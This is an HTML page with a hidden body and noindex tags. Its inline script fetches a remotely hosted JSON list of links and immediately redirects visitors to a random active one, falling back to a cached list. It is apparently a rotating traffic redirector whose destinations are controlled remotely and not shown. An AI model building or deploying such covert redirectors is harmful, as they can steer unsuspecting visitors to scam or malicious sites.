<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">
  <script>
    (async () => {
      // 延迟0毫秒执行，确保HTML标签还没渲染
      try {
        const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
        const LOCAL_KEY = "lastActiveLinks";
        let activeLinks = [];

        const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
        const data = await res.json();
        activeLinks = data.links.filter(l => l.active);

        if (!activeLinks.length) throw new Error("No active links");

        // 缓存
        localStorage.setItem(LOCAL_KEY, JSON.stringify(activeLinks));

        // 立即跳转（⚡零渲染）
        location.replace(activeLinks[Math.floor(Math.random() * activeLinks.length)].url);

      } catch (e) {
        console.error("Redirect failed:", e);
        const cached = JSON.parse(localStorage.getItem("lastActiveLinks") || "[]");
        if (cached.length) {
          location.replace(cached[Math.floor(Math.random() * cached.length)].url);
        } else {
          document.write("<html><body></body></html>");
        }
      }
    })();
  </script>
</head>
<body style="display:none;"></body>
</html>
